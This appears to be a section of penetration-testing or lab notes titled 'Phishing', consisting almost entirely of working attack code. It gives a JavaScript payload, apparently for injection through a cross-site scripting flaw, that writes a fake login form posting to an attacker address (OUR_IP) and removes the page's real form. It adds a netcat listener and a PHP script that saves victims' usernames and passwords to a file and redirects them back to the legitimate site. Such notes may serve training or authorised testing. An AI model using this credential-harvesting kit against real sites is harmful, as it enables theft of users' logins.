#### Phishing

Simple login javascript:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Remove other parts of the page:
```javascript
document.getElementById('urlform').remove();
```

Together:
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove(); <!--
```

```shell-session
sudo nc -lvnp 80
```

```shell-session
mkdir /tmp/tmpserver
```
```shell-session
cd /tmp/tmpserver
```
```shell-session
vi index.php #at this step we write our index.php file
```
```shell-session
sudo php -S 0.0.0.0:80
```

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

This will log credentials and return the user to the legitimate site.


